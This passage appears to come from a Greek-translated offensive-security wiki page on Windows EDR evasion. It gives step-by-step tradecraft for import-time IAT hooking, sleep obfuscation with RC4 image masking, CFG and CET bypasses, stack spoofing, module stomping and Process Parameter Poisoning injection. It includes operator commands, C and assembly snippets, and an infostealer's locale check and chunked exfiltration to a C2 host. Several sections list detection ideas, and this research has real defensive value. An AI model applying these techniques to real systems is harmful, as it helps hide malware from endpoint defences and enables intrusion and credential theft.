- Συνδύασέ το με τεχνικές stack cutting/stack stitching, ώστε να καταλήγεις μέσα στα αναμενόμενα frames πριν από το API prologue.

Operational integration
- Πρόσθεσε τον reflective loader στην αρχή των post-ex DLLs, ώστε τα PIC και hooks να αρχικοποιούνται αυτόματα όταν φορτώνεται το DLL.
- Χρησιμοποίησε ένα Aggressor script για να καταχωρίζεις target APIs, ώστε τα Beacon και BOFs να επωφελούνται διαφανώς από το ίδιο evasion path χωρίς αλλαγές στον κώδικα.

Detection/DFIR considerations
- IAT integrity: entries που κάνουν resolve σε non-image (heap/anon) addresses· περιοδική επαλήθευση των import pointers.
- Stack anomalies: return addresses που δεν ανήκουν σε loaded images· απότομες μεταβάσεις σε non-image PIC· ασυνεπής RtlUserThreadStart ancestry.
- Loader telemetry: in-process writes στο IAT, πρώιμη δραστηριότητα του DllMain που τροποποιεί import thunks, απρόσμενες RX regions που δημιουργούνται κατά το load.
- Image-load evasion: αν γίνεται hooking του LoadLibrary*, παρακολούθησε ύποπτα loads από automation/clr assemblies που συσχετίζονται με memory masking events.

Related building blocks and examples
- Reflective loaders που εκτελούν IAT patching κατά το load (π.χ. TitanLdr, AceLdr)
- Memory masking hooks (π.χ. simplehook) και stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (π.χ. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks μέσω resident PICO

Αν ελέγχεις έναν reflective loader, μπορείς να κάνεις hook στα imports **κατά τη διάρκεια του** `ProcessImports()`, αντικαθιστώντας τον δείκτη `GetProcAddress` του loader με έναν custom resolver που ελέγχει πρώτα τα hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Δημιούργησε ένα **resident PICO** (persistent PIC object) που επιβιώνει αφού το transient loader PIC απελευθερώσει τη μνήμη του.
- Κάνε export μια συνάρτηση `setup_hooks()` που overwrites τον import resolver του loader (π.χ. `funcs.GetProcAddress = _GetProcAddress`).
- Στο `_GetProcAddress`, παράλειψε τα ordinal imports και χρησιμοποίησε ένα hash-based hook lookup όπως `__resolve_hook(ror13hash(name))`. Αν υπάρχει hook, επέστρεψέ το· διαφορετικά κάνε delegate στο real `GetProcAddress`.
- Καταχώρισε τα hook targets κατά το link time με entries Crystal Palace `addhook "MODULE$Func" "hook"`. Το hook παραμένει έγκυρο επειδή βρίσκεται μέσα στο resident PICO.

Αυτό παρέχει **import-time IAT redirection** χωρίς patching στο code section του loaded DLL μετά το load.

### Εξαναγκασμός hookable imports όταν το target χρησιμοποιεί PEB-walking

Τα import-time hooks ενεργοποιούνται μόνο αν η συνάρτηση βρίσκεται πράγματι στο IAT του target. Αν ένα module κάνει resolve APIs μέσω PEB-walk + hash (χωρίς import entry), εξανάγκασε ένα πραγματικό import, ώστε η διαδρομή `ProcessImports()` του loader να το εντοπίσει:

- Αντικατάστησε το hashed export resolution (π.χ. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) με μια άμεση αναφορά όπως `&WaitForSingleObject`.
- Ο compiler θα παράγει μια IAT entry, επιτρέποντας interception όταν ο reflective loader κάνει resolve τα imports.

### Ekko-style sleep/idle obfuscation χωρίς patching του `Sleep()`

Αντί να κάνεις patch το `Sleep`, κάνε hook τα **actual wait/IPC primitives** που χρησιμοποιεί το implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Για μεγάλα waits, τύλιξε την κλήση σε μια Ekko-style obfuscation chain που κρυπτογραφεί το in-memory image κατά το idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Χρησιμοποίησε το `CreateTimerQueueTimer` για να προγραμματίσεις μια ακολουθία callbacks που καλούν το `NtContinue` με crafted `CONTEXT` frames.
- Τυπική chain (x64): όρισε το image σε `PAGE_READWRITE` → RC4 encrypt μέσω του `advapi32!SystemFunction032` σε ολόκληρο το mapped image → εκτέλεσε το blocking wait → RC4 decrypt → **επανάφερε τα per-section permissions** διατρέχοντας τα PE sections → signal completion.
- Το `RtlCaptureContext` παρέχει ένα template `CONTEXT`· κλωνοποίησέ το σε πολλαπλά frames και όρισε τα registers (`Rip/Rcx/Rdx/R8/R9`) ώστε να καλούν κάθε step.

Operational detail: επέστρεφε “success” για μεγάλα waits (π.χ. `WAIT_OBJECT_0`), ώστε ο caller να συνεχίζει ενώ το image είναι masked. Αυτό το pattern κρύβει το module από scanners κατά τη διάρκεια idle windows και αποφεύγει το κλασικό signature του “patched `Sleep()`”.

Detection ideas (telemetry-based)
- Bursts από `CreateTimerQueueTimer` callbacks που δείχνουν στο `NtContinue`.
- Χρήση του `advapi32!SystemFunction032` σε μεγάλα contiguous buffers μεγέθους image.
- Μεγάλης έκτασης `VirtualProtect` που ακολουθείται από custom per-section permission restoration.

### Runtime CFG registration για sleep-obfuscation gadgets

Σε CFG-enabled targets, το πρώτο indirect jump σε ένα mid-function gadget όπως `jmp [rbx]` ή `jmp rdi` συνήθως θα προκαλέσει crash στη διεργασία με `STATUS_STACK_BUFFER_OVERRUN`, επειδή το gadget δεν υπάρχει στα CFG metadata του module. Για να παραμένουν ενεργές οι Ekko/Kraken-style chains μέσα σε hardened processes:<sup>[[30]](#references)</sup>

- Κατάχωρισε κάθε indirect destination που χρησιμοποιείται από τη chain με `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` και entries `CFG_CALL_TARGET_VALID`.
- Για addresses μέσα σε loaded images (`ntdll`, `kernel32`, `advapi32`), το `MEMORY_RANGE_ENTRY` πρέπει να ξεκινά από το **image base** και να καλύπτει το **πλήρες image size**.
- Για manually mapped/PIC/stomped regions, χρησιμοποίησε το **allocation base** και το allocation size.
- Σήμανε όχι μόνο το dispatch gadget, αλλά και τα exports που προσεγγίζονται indirectly (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), καθώς και οποιαδήποτε attacker-controlled executable sections θα γίνουν indirect targets.

Αυτό μετατρέπει τις sleep chains τύπου ROP/JOP από “works only in non-CFG processes” σε reusable primitive για τα `explorer.exe`, browsers, `svchost.exe` και άλλα endpoints που έχουν γίνει compile με `/guard:cf`.

### CET-safe stack spoofing για sleeping threads

Η πλήρης αντικατάσταση `CONTEXT` είναι θορυβώδης και μπορεί να αποτύχει σε CET Shadow Stack systems, επειδή ένα spoofed `Rip` πρέπει και πάλι να συμφωνεί με το hardware shadow stack. Ένα ασφαλέστερο sleep-masking pattern είναι:<sup>[[30]](#references)</sup>

- Επίλεξε ένα άλλο thread στην ίδια διεργασία και διάβασε τα stack bounds του `NT_TIB` / TEB (`StackBase`, `StackLimit`) μέσω του `NtQueryInformationThread`.
- Κάνε backup το πραγματικό TEB/TIB του τρέχοντος thread.
- Κατέγραψε το real sleeping context με `GetThreadContext`.
- Αντέγραψε **μόνο** το real `Rip` στο spoof context, αφήνοντας ανέπαφα τα spoofed `Rsp`/stack state.
- Κατά τη διάρκεια του sleep window, αντέγραψε το `NT_TIB` του spoof thread στο current TEB, ώστε οι stack walkers να κάνουν unwind μέσα σε legitimate stack range.
- Μετά την ολοκλήρωση του wait, επανάφερε το αρχικό TIB και το thread context.

Αυτό διατηρεί ένα CET-consistent instruction pointer, ενώ παραπλανά τους EDR stack walkers που εμπιστεύονται τα TEB stack metadata για την επικύρωση των unwinds.

### APC-based alternative: Kraken Mask

Αν το timer-queue dispatch έχει πολλά signatures, η ίδια sleep-encrypt-spoof-restore sequence μπορεί να εκτελεστεί από ένα suspended helper thread χρησιμοποιώντας queued APCs:<sup>[[27]](#references)</sup>

- Δημιούργησε ένα helper thread με το `NtTestAlert` ως entrypoint.
- Κάνε queue τα prepared `CONTEXT` frames/APCs με `NtQueueApcThread` και κάνε drain μέσω `NtAlertResumeThread`.
- Αποθήκευσε το chain state στο heap αντί για το helper stack, ώστε να αποφύγεις την εξάντληση του default 64 KB thread stack.
- Χρησιμοποίησε το `NtSignalAndWaitForSingleObject` για atomic signal του start event και block.
- Κάνε suspend το main thread πριν από την επαναφορά του TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), ώστε να μειώσεις το race window κατά το οποίο ένας scanner θα μπορούσε να εντοπίσει ένα half-restored stack.

Αυτό αντικαθιστά το signature `CreateTimerQueueTimer` + `NtContinue` με ένα helper-thread/APC signature, διατηρώντας τους ίδιους στόχους RC4 masking και stack-spoofing.

Additional detection ideas
- `NtSetInformationVirtualMemory` με `VmCfgCallTargetInformation` λίγο πριν από sleeps, waits ή APC dispatch.
- `GetThreadContext`/`SetThreadContext` γύρω από `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ή `ConnectNamedPipe`.
- `NtQueryInformationThread` που ακολουθείται από direct writes στα stack bounds του TEB/TIB του current thread.
- `NtQueueApcThread`/`NtAlertResumeThread` chains που οδηγούν indirectly στα `SystemFunction032`, `VirtualProtect` ή σε helpers για section-permission restoration.
- Επαναλαμβανόμενη χρήση σύντομων gadget signatures όπως `FF 23` (`jmp [rbx]`) ή `FF E7` (`jmp rdi`) ως dispatch pivots μέσα σε signed modules.


## Precision Module Stomping

Το Module stomping εκτελεί payloads από το **`.text` section ενός DLL που έχει ήδη γίνει mapped μέσα στο target process**, αντί να κάνει allocate obvious private executable memory ή να φορτώνει ένα νέο sacrificial DLL. Το overwrite target πρέπει να είναι ένα **loaded, disk-backed image**, του οποίου ο code space μπορεί να φιλοξενήσει το payload χωρίς να καταστρέψει code paths που χρειάζεται ακόμη η διεργασία.<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

Το naive stomping σε common modules όπως τα `uxtheme.dll` ή `comctl32.dll` είναι fragile: το DLL μπορεί να μην έχει φορτωθεί στο remote process και μια υπερβολικά μικρή code region θα προκαλέσει crash στη διεργασία. Ένα πιο reliable workflow είναι:

1. Κάνε enumerate τα modules του target process και κράτησε μια **names-only include list** των DLLs που έχουν ήδη φορτωθεί.
2. Κάνε build πρώτα το payload και κατέγραψε το **ακριβές byte size** του.
3. Κάνε scan τα candidate DLLs στον δίσκο και σύγκρινε το PE section **`.text` `Misc_VirtualSize`** με το payload size. Αυτό έχει μεγαλύτερη σημασία από το file size, επειδή αντικατοπτρίζει το μέγεθος του executable section **όταν γίνεται mapped στη μνήμη**.
4. Κάνε parse το **Export Address Table (EAT)** και επίλεξε ένα exported function RVA ως το stomp start offset.
5. Υπολόγισε το **blast radius**: αν το payload ξεπερνά το boundary της επιλεγμένης συνάρτησης, θα overwrite τα adjacent exports που βρίσκονται μετά από αυτή στη μνήμη.

Τυπικά recon/selection helpers που εμφανίζονται in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Σημειώσεις λειτουργίας
- Προτιμήστε DLLs που είναι **ήδη φορτωμένα** στην απομακρυσμένη διεργασία, για να αποφύγετε το telemetry του `LoadLibrary`/των μη αναμενόμενων image loads.
- Προτιμήστε exports που εκτελούνται σπάνια από την εφαρμογή-στόχο· διαφορετικά, οι κανονικές διαδρομές κώδικα ενδέχεται να εκτελέσουν τα stomped bytes πριν ή μετά τη δημιουργία του thread.
- Τα μεγάλα implants συχνά απαιτούν αλλαγή του τρόπου ενσωμάτωσης του shellcode, από string literal σε **byte-array/braced initializer**, ώστε ολόκληρο το buffer να αναπαρίσταται σωστά στον injector source.

Ιδέες ανίχνευσης
- Remote writes σε **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) αντί για τις συνηθέστερες private RWX/RX allocations.
- Export entry points των οποίων τα in-memory bytes δεν ταιριάζουν πλέον με το backing file στον δίσκο.
- Remote threads ή context pivots που ξεκινούν την εκτέλεση μέσα σε legitimate DLL export, του οποίου τα πρώτα bytes τροποποιήθηκαν πρόσφατα.
- Ύποπτες ακολουθίες `VirtualProtect(Ex)` / `WriteProcessMemory` σε DLL `.text` pages, ακολουθούμενες από δημιουργία thread.

## Process Parameter Poisoning (P3)

Το Process Parameter Poisoning (P3) είναι μια τεχνική **process-injection / EDR-evasion** που αποφεύγει το κλασικό remote write path (`VirtualAllocEx` + `WriteProcessMemory`). Αντί να αντιγράφει bytes σε έναν ήδη εκτελούμενο target, εκμεταλλεύεται το γεγονός ότι τα Windows **αντιγράφουν επιλεγμένες παραμέτρους εκκίνησης της `CreateProcessW` στη child process** και τις αποθηκεύουν μέσα στο `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers που αντιγράφονται από την `CreateProcessW`

Χρήσιμα carriers είναι:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (με `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Πρακτικοί περιορισμοί των carriers:

- Το `lpCommandLine` πρέπει να δείχνει σε **writable memory** για την `CreateProcessW` και περιορίζεται σε **32.767 Unicode characters**, συμπεριλαμβανομένου του null terminator.
- Το `lpEnvironment` πρέπει να είναι ένα Unicode environment block αποτελούμενο από διαδοχικά strings `NAME=VALUE\0`, τα οποία τερματίζονται από ένα επιπλέον `\0`.
- Το `lpReserved` είναι επίσημα reserved, επομένως το mapping προς το `ShellInfo` πρέπει να αντιμετωπίζεται ως implementation detail και όχι ως σταθερό documented contract.

Αυτό μετατρέπει τη φυσιολογική δημιουργία διεργασίας σε **payload-transfer primitive**. Ο operator δημιουργεί τη child process με attacker-controlled startup data και αφήνει τα Windows να εκτελέσουν το cross-process copy.

### Remote lookup flow χωρίς remote write APIs

Μετά τη δημιουργία της child process, επιλύστε το copied buffer με **read-only** primitives:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → λήψη του `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Ανάγνωση του remote `PEB`
3. Ακολούθηση του `PEB.ProcessParameters`
4. Ανάγνωση του `RTL_USER_PROCESS_PARAMETERS`
5. Χρήση του επιλεγμένου pointer:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Ελάχιστη ροή:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Εκτέλεση του αντιγραμμένου parameter buffer

Η αντιγραμμένη περιοχή παραμέτρων είναι συνήθως `RW`, όχι executable. Ένα συνηθισμένο P3 chain είναι:

1. Δημιουργία του process κανονικά (όχι suspended)
2. Μετατροπή της επιλεγμένης σελίδας παραμέτρων σε executable με `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Επαναχρησιμοποίηση του main thread handle που έχει ήδη επιστραφεί στο `PROCESS_INFORMATION`
4. Redirect της εκτέλεσης με `NtSetContextThread` (`CONTEXT_CONTROL`, overwrite του `RIP`)

Σε αντίθεση με τα κλασικά thread hijacking workflows, αυτό **δεν απαιτεί** `SuspendThread` / `ResumeThread`; το context μπορεί να αλλάξει απευθείας στο returned main thread handle.

Αυτό αποφεύγει αρκετά APIs που παρακολουθούνται συχνά για injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- συχνά επίσης `SuspendThread` / `ResumeThread`

### Περιορισμός null-byte και staged shellcode

Και οι τρεις carriers είναι **string ή string-like data**, επομένως ένα raw payload που περιέχει `0x00` περικόπτεται κατά τη μεταφορά. Μια πρακτική λύση είναι ένα **null-free first stage** που ανακατασκευάζει constants κατά το runtime και στη συνέχεια φορτώνει ένα αυθαίρετο second stage.

Ένα απλό pattern είναι η σύνθεση constants με βάση το XOR:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Αυτό επιτρέπει στο first stage να δημιουργεί strings στο stack, ορίσματα API, paths DLL ή έναν loader για shellcode δεύτερου σταδίου χωρίς να ενσωματώνει null bytes στην παράμετρο που μεταφέρεται.

### Κλήσεις API βασισμένες στο stack από το first stage

Όταν το first stage πρέπει να καλέσει APIs όπως το `LoadLibraryA`, μπορεί να:

- κάνει push το string/buffer στο stack του target
- δεσμεύσει το **32-byte x64 shadow space**
- ορίσει τα `RCX`, `RDX`, `R8`, `R9` σε constants ή pointers σχετικούς με το `RSP`
- διατηρήσει το `RSP` **16-byte aligned** πριν από την κλήση

Στη συνέχεια, ένα second stage μπορεί να αντιγραφεί από το stack σε μια allocation `PAGE_READWRITE`, να αλλάξει σε `PAGE_EXECUTE_READ` με `VirtualProtect` και να γίνει jump σε αυτό, αποφεύγοντας μια άμεση RWX allocation.

### Ιδέες για detection

Καλές ευκαιρίες για hunting που αναφέρουν οι συγγραφείς:

- `VirtualProtectEx` / `NtProtectVirtualMemory` που κάνει **process-parameter pages executable**
- αυτή η αλλαγή protection να ακολουθείται από `SetThreadContext` / `NtSetContextThread`
- remote reads του `PEB` και έπειτα του `RTL_USER_PROCESS_PARAMETERS`
- ασυνήθιστα μεγάλα / υψηλού entropy `lpCommandLine`, `lpEnvironment` ή `STARTUPINFO.lpReserved` values κατά τη δημιουργία process

### Σημειώσεις

- Το P3 είναι ένα **cross-process transfer trick**, όχι από μόνο του ένα πλήρες execution primitive: η αντιγραμμένη παράμετρος εξακολουθεί να χρειάζεται αλλαγή σε execute-permission και μια μέθοδο redirection για την εκτέλεση.
- Το `RtlCreateProcessReflection` / Dirty Vanity εξετάστηκε από τους συγγραφείς, αλλά απορρίφθηκε επειδή εσωτερικά φτάνει σε ύποπτα primitives όπως τα `NtWriteVirtualMemory` και `NtCreateThreadEx`.

## Tradecraft του SantaStealer για Fileless Evasion και Credential Theft

Το SantaStealer (γνωστό και ως BluelineStealer) δείχνει πώς τα σύγχρονα info-stealers συνδυάζουν AV bypass, anti-analysis και credential access σε ένα ενιαίο workflow.<sup>[[24]](#references)</sup>

### Gating βάσει keyboard layout & καθυστέρηση sandbox

- Ένα config flag (`anti_cis`) απαριθμεί τα εγκατεστημένα keyboard layouts μέσω του `GetKeyboardLayoutList`. Αν βρεθεί Cyrillic layout, το sample δημιουργεί έναν κενό marker `CIS` και τερματίζει πριν εκτελέσει stealers, διασφαλίζοντας ότι δεν θα detonates ποτέ σε εξαιρούμενα locales, ενώ αφήνει ένα hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Πολυεπίπεδη λογική `check_antivm`

- Η Variant A διατρέχει τη λίστα διεργασιών, υπολογίζει το hash κάθε ονόματος με ένα custom rolling checksum και το συγκρίνει με ενσωματωμένες blocklists για debuggers/sandboxes. Επαναλαμβάνει το checksum για το όνομα του υπολογιστή και ελέγχει working directories όπως `C:\analysis`.
- Η Variant B επιθεωρεί ιδιότητες του συστήματος (κατώτατο όριο πλήθους διεργασιών, πρόσφατο uptime), καλεί την `OpenServiceA("VBoxGuest")` για να ανιχνεύσει VirtualBox additions και εκτελεί timing checks γύρω από sleep operations για να εντοπίσει single-stepping. Οποιοδήποτε hit διακόπτει την εκτέλεση πριν από την εκκίνηση των modules.

### Fileless helper + double ChaCha20 reflective loading

- Το κύριο DLL/EXE ενσωματώνει έναν Chromium credential helper, ο οποίος είτε αποθηκεύεται στον δίσκο είτε γίνεται manually mapped in-memory. Στο fileless mode, επιλύει μόνος του τα imports/relocations, ώστε να μη γράφονται helper artifacts.
- Ο helper αποθηκεύει ένα second-stage DLL κρυπτογραφημένο δύο φορές με ChaCha20 (δύο keys των 32 bytes + nonces των 12 bytes). Μετά και τα δύο passes, φορτώνει reflectively το blob (χωρίς `LoadLibrary`) και καλεί τα exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, τα οποία προέρχονται από το [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Οι ρουτίνες του ChromElevator χρησιμοποιούν direct-syscall reflective process hollowing για injection σε έναν ενεργό Chromium browser, κληρονομούν τα AppBound Encryption keys και κάνουν decrypt passwords/cookies/credit cards απευθείας από SQLite databases, παρά το ABE hardening.


### Modular in-memory collection & chunked HTTP exfil

- Η `create_memory_based_log` διατρέχει έναν global πίνακα function pointers `memory_generators` και δημιουργεί ένα thread ανά ενεργοποιημένο module (Telegram, Discord, Steam, screenshots, documents, browser extensions κ.λπ.). Κάθε thread γράφει τα αποτελέσματα σε shared buffers και αναφέρει το file count μετά από ένα ~45s join window.
- Όταν ολοκληρωθεί, όλα συμπιέζονται με τη statically linked βιβλιοθήκη `miniz` ως `%TEMP%\\Log.zip`. Στη συνέχεια, το `ThreadPayload1` κάνει sleep για 15s και μεταδίδει το archive σε chunks των 10 MB μέσω HTTP POST στο `http://<C2>:6767/upload`, προσποιούμενο browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Κάθε chunk προσθέτει `User-Agent: upload`, `auth: <build_id>`, προαιρετικά `w: <campaign_tag>`, ενώ το τελευταίο chunk προσθέτει `complete: true`, ώστε το C2 να γνωρίζει ότι ολοκληρώθηκε το reassembly.

## References

- [1] [Advanced Evasion Tradecraft: Ακριβές Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, κανένα άλλο δωρεάν πέρασμα για malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Νέα infection chain και obfuscation βασισμένο στο ConfuserEx για το DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Πρέπει να εμπιστεύεστε το zero trust σας; Παράκαμψη των posture checks του Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Πριν από το ToolShell: Διερεύνηση των προηγούμενων ransomware operations του Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Κατάχρηση των Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Σειρά αναζήτησης Dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Ασφάλεια διεργασιών και δικαιώματα πρόσβασης](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Αναφορά EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Αντιμετώπιση των EDRs με την υποστήριξη του Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Διάρρηξη του προστατευτικού κελύφους του Windows Defender με την τεχνική Folder Redirect](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Αναφορά εντολής mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Κάτω από την Pure Curtain: Από RAT σε Builder και Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – Το SantaStealer έρχεται στην πόλη: Ένα νέο, φιλόδοξο Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Εξουδετέρωση malware Node.js με API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Βάζοντας το Adaptix για ύπνο με το Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET και Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Απόκρυψη του Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Κατάχρηση του Chrome Remote Desktop σε Red Team Operations: Ένας πρακτικός οδηγός](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing του remediation driver του Defender ως kernel operation primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Δημιουργία self-masking functions με χρήση LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
{{#include ../banners/hacktricks-training.md}}
